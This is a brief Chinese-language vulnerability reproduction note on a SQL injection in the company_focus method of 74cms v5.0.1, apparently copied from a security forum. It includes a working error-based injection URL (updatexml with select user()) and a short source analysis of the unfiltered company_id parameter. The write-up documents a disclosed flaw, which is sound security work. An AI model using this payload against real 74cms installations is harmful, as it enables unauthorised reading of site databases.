# 74cms v5.0.1前台sql注入

> 原文：[https://www.zhihuifly.com/t/topic/2795](https://www.zhihuifly.com/t/topic/2795)

# 74cms v5.0.1 前台sql注入

## 一、漏洞简介

74cms 5.0.1 前台AjaxPersonalController.class.php存在SQL注入

## 二、漏洞影响

## 三、复现过程

### 具体信息

文件位置：74cms\upload\Application\Home\Controller\AjaxPersonalController.class.php

方法：function company_focus($company_id)

是否需登录：需要

登录权限：普通用户即可

### Payload:

```
http://0-sec.org/74cms/5.0.1/upload/index.php?m=&c=AjaxPersonal&a=company_focus&company_id[0]=match&company_id[1][0]=aaaaaaa") and updatexml(1,concat(0x7e,(select user())),0) -- a 
```

![image](img/18ca92dd70bafc9493f20840eb5c27e6.png)

### 源码分析：

文件：74cms\upload\Application\Home\Controller\AjaxPersonalController.class.php

company_focus 方法是参数化函数，$company_id参数是不经过I函数过滤的，所以只要where可以控制，那就可以注入

![image](img/b899b8cd0c34d7e28b6b5398b55d9a7e.png)

跟踪add_focus(),发现SQL语句参数外部都可以控制，导致了注入漏洞

![image](img/fc31cf6834ac6390ddef158127ec1f3f.png)